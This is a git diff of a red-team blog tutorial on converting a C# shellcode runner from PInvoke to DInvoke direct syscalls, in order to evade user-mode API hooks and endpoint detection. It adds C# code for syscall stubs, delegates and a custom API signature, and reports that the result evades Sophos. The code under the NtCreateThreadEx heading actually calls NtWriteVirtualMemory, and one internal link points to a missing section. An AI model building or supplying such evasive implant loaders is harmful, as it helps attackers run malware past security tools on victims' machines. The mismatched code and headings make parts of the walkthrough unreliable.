@@ -1,8 +1,25 @@
 # How to DInvoke
 
+<small>tags: redteam, pentest, malware, payload, shellcode, dinvoke</small>
+
+<small>date: Fri Sep 10, 2021</small>
+
 ## TLDR
 
 Introduction into converting a C# PInvoke shellcode runner to a DInvoke shellcode runner. Also covered- using API Monitor v2 to hook Win32 API calls, writing a new D/Invoke delegate, and investigating detections of Defender and Sophos EDR against the PInvoke and DInvoke versions of the runner. 
+
+## ToC
+
+* [Background](#background)
+* [Resources](#resources)
+* [Goals](#goals)
+* [The Runner](#the-runner)
+* [How to Monitor Win32 API Calls](#how-to-monitor-win32-api-calls)
+* [Observe](#observe)
+* [DInvoke Targets](#dinvoke-targets)
+* [Using DInvoke](#using-dinvoke)
+* [Execution with DInvoke](#execution-with-dinvoke)
+* [Investigation](#investigation)
 
 ## Background
 
@@ -11,11 +28,14 @@ C# can be used to execute shellcode to launch your implant via access to the Win
 ## Resources
 
 1. [github.com/TheWover/DInvoke](https://github.com/TheWover/DInvoke)
-2. [Syscalls with D/InvokeDefeating EDR's using D/Invoke - RastaMouse](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)
-3. [Defeating EDR's using D/Invoke - NVISO](https://www.youtube.com/watch?v=d_Z_WV9fp9Q)
-4. [Dynamic Invocation in .NET to bypass hooks - NVISO](https://blog.nviso.eu/2020/11/20/dynamic-invocation-in-net-to-bypass-hooks/)
-5. [Lets Create An EDR… And Bypass It! Part 1 - ethicalchaos](https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/)
-6. [Lets Create An EDR… And Bypass It! Part 2 - ethicalchaos](https://ethicalchaos.dev/2020/06/14/lets-create-an-edr-and-bypass-it-part-2/)
+2. [Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks) - thewover](https://thewover.github.io/Dynamic-Invoke/)
+3. [Syscalls with D/InvokeDefeating EDR's using D/Invoke - RastaMouse](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)
+4. [Defeating EDR's using D/Invoke - NVISO](https://www.youtube.com/watch?v=d_Z_WV9fp9Q)
+5. [Dynamic Invocation in .NET to bypass hooks - NVISO](https://blog.nviso.eu/2020/11/20/dynamic-invocation-in-net-to-bypass-hooks/)
+6. [Lets Create An EDR… And Bypass It! Part 1 - ethicalchaos](https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/)
+7. [Lets Create An EDR… And Bypass It! Part 2 - ethicalchaos](https://ethicalchaos.dev/2020/06/14/lets-create-an-edr-and-bypass-it-part-2/)
+8. [Operational Challenges in Offensive C# - cobbr](https://cobbr.io/SharpGen.html)
+9. [Offensive P/Invoke: Leveraging the Win32 API from Managed Code - SpecterOps](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d)
 
 ## Goals
 
@@ -121,7 +141,7 @@ Leveraging the program's prompts, we can note or select the last row in the Summ
 
 ![](assets/2021-09-09_19-05.png)
 
-In this case, it is easy to determine which is the call from our program as only one of the 2 calls marks the space with 'execute' permissions.
+In this case, it is easy to determine which is the call from our program as only 1 of the 2 calls marks the space with 'execute' permissions.
 
 ![](assets/2021-09-09_19-08.png)
 
@@ -156,14 +176,6 @@ An interesting note here, the `Ex` portion of `NtCreateThreadEx` indicates an ex
 The `WaitForSingleObject` API from kernel32.dll will be calling the `NtWaitForSingleObject` API from ntdll.dll.
 
 ![](assets/2021-09-06_19-17.png)
-
-#### Target Recap
-
-The functions used that access the Win32 API are as follows.
-
-- `VirtualAlloc` resides in `kernel32.dll`, calls `NtAllocateVirtualMemory` under the hood
-- `CreateThread` resides in `kernel32.dll`, calls `NtCreateThreadEx` under the hood
-- `WaitForSingleObject` resides in `kernel32.dll`, calls `NtWaitForSingleObject` under the hood
 
 ## Using DInvoke
 
@@ -201,7 +213,7 @@ In this case, we'll copy the DInvoke code base into the runner solution.
 
 ![](assets/2021-09-09_20-10.png)
 
-Note, dropping DInvoke code base into the runner project and compiling without modification to the code does not pass disk analysis. 
+Note, dropping DInvoke code base into the runner project and compiling without modification to the code [does not pass](https://github.com/rasta-mouse/ThreatCheck) Defender disk analysis. 
 
 ![](assets/2021-09-09_20-28.png)
 
@@ -214,4 +226,179 @@ DInvoke can call APIs in various ways, including:
 3. Overload Mapping
 4. Direct Syscall
 
-In this case, we'll leverage direct syscalls.
+A more comprehensive list can be found [here](https://thewover.github.io/Dynamic-Invoke/) under the "Calling Modules" section. 
+
+In this case, we'll leverage direct syscalls. For this method, to call an ntdll.dll API, 2 things are required, the API Signature and the Delegate.
+
+The DInvoke tool has many Delegates already defined, however it is also possible to add new Delegates when the target API is not available. 
+
+Let's get started.
+
+### Target Recap
+
+The functions being used by the runner that access the Win32 API are as follows.
+
+- `VirtualAlloc` resides in `kernel32.dll`, calls `NtAllocateVirtualMemory` under the hood
+- `CreateThread` resides in `kernel32.dll`, calls `NtCreateThreadEx` under the hood
+- `WaitForSingleObject` resides in `kernel32.dll`, calls `NtWaitForSingleObject` under the hood
+
+### Executing an API that Exists in DInvoke
+
+To begin, we'll start with `NtAllocateVirtualMemory`.
+
+#### NtAllocateVirtualMemory
+
+First up, we'll translate the `VirtualAlloc` call. 
+
+##### Finding Existing Delegates
+
+One can check for the existence DInvoke delegates and function wrappers by searching through the project or leveraging an IDE auto completion mechanism.
+
+![](assets/2021-09-10_15-15.png)
+
+![](assets/2021-09-10_15-18.png)
+
+##### Locating and Executing
+
+Step one is to locate the function, the easiest way being the `DynamicAPIInvoke` function. A quick method to get these steps right is to use what's already out there. Searching the internet for terms such as "dinvoke NtAllocateVirtualMemory", or whatever function you're after, can yield previous work by others to model your code after. A couple good examples might be [@shitsecure's](https://twitter.com/shitsecure) [SyscallAmsiScanBufferBypass](https://github.com/S3cur3Th1sSh1t/SyscallAmsiScanBufferBypass/blob/a10c04826d494fb0cae2869e81129ef5daa7b8ef/SyscallBypass/DInvoke.cs#L991) or [@Jean_Maes_1994's](https://twitter.com/Jean_Maes_1994) [DemoDInvokeLoader](https://github.com/NVISOsecurity/brown-bags/tree/main/DInvoke%20to%20defeat%20EDRs).
+
+GetSyscallStub.
+
+```csharp
+IntPtr syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
+```
+
+Step two is to define the function.
+
+```csharp
+DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory syscallAllocateVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
+```
+
+With the function setup, we can now call it.
+
+```csharp
+// exec
+var result = syscallAllocateVirtualMemory(
+    thisproc.Handle,
+    ref baseAddress,
+    IntPtr.Zero,
+    ref regionSize,
+    DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE,
+    0x04);
+```
+
+#### NtCreateThreadEx
+
+As `NtCreateThreadEx` is also an already existing delegate, we can repeat the process again.
+
+```csharp
+// setup
+syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
+DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory ntWriteVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory));
+
+// exec
+result = ntWriteVirtualMemory(
+    thisproc.Handle,
+    baseAddress,
+    buffer,
+    (uint)buf.Length,
+    ref bytesWritten);
+```
+
+#### NtWaitForSingleObject
+
+As the delegates existed, our first 2 calls were easy. Next up is `NtWaitForSingleObject`, which does not exist in the project. To use this API, we'll need 2 things- a delegate and an API signature.
+
+#### Creating a New DInvoke Delegate
+
+To get some reference points, we can use un/documented API resouces such as [undocumented.ntinternals.net](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtWaitForSingleObject.html), [pinvoke.net](https://www.pinvoke.net/default.aspx/kernel32.waitforsingleobject), and [msdn](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55).
+
+Undocumented NT Internals documents `NtWaitForSingleObject` as follows.
+
+```c
+NTSYSAPI 
+NTSTATUS
+NTAPI
+
+NtWaitForSingleObject(
+  IN HANDLE               ObjectHandle,
+  IN BOOLEAN              Alertable,
+  IN PLARGE_INTEGER       TimeOut OPTIONAL );
+```
+
+Taking a stab at this delegate a few times, the working version ended up as follows.
+
+```csharp
+public class MYDELEGATES
+{
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(
+        IntPtr hHandle,
+        bool Alertable,
+        IntPtr Timeout);
+}
+```
+
+#### Creating a New DInvoke API Signature
+
+Next, the signature. As a base, the DInvoke signatures in the DInvoke code base can be searched for sigs of the same type, `public static DInvoke.Data.Native.NTSTATUS` and (hopefully) handling the same data, such as handles. Next, we define the arguments passed to the function definition. The next modification was to modify the arguments passed to the `object[]` array. Then, modify the API function name passed to both `DynamicAPIInvoke` and the delegate passed to `typeof`. Finally, we modify the name of the parameter that is set by calling the function and its return value. The final code is as follows. 
+
+```csharp
+public class TinyDinvoke
+{
+    //API signature
+    public static DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(IntPtr hHandle, bool Alertable, IntPtr TimeOut)
+    {
+        object[] funcargs = {
+        hHandle,Alertable,TimeOut
+        };
+
+        DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtWaitForSingleObject", typeof(MYDELEGATES.NtWaitForSingleObject), ref funcargs);
+        hHandle = (IntPtr)funcargs[0];
+        
+        return retvalue;
+    }
+}
+```
+
+#### Execution
+
+With the new delegate and signature defined, we can implement the setup and execution of the syscall. If the delegate and signature are right, this step will not be much different then using already defined functions. 
+
+```csharp
+// setup
+syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
+Console.WriteLine("[>] syscall: " + syscall);
+MYDELEGATES.NtWaitForSingleObject syscallWaitForSingleObject = (MYDELEGATES.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(syscall, typeof(MYDELEGATES.NtWaitForSingleObject));
+
+// exec
+syscallWaitForSingleObject(hThread, false, IntPtr.Zero);
+```
+
+## Investigation
+
+After translating the PInvoke version of the basic runner to a DInvoke version, the runner can now execute the implant shellcode with syscalls, evading hooking done at the user (kernel32.dll) level.
+
+### Shells
+
+Testing out the end result, we have a functioning shellcode runner that only uses syscalls for API execution.
+
+![](assets/2021-09-10_16-19.png)
+
+### Monitoring
+
+Filtering API Monitor to monitor our suspect kernel32.dll API calls and executing the syscall version yields.. well, nothing.
+
+![](assets/)
+
+### Detection
+
+While the runner works successfully, as can be seen in the [Embed DInvoke](#embed-dinvoke) section, the executable is flagged on disk by Defender. What's interesting, is while Defender catches the program, a quick test against Sophos EDR yields an entirely different result. 
+
+Below is the detection details when running the PInvoke version of the shellcode runner.
+
+![](assets/2021-09-09_13-09-04.png)
+
+Yet, for the syscall version, Sophos doesn't bat an eye. :)
+
+![](assets/2021-09-10_19-30-06.png)
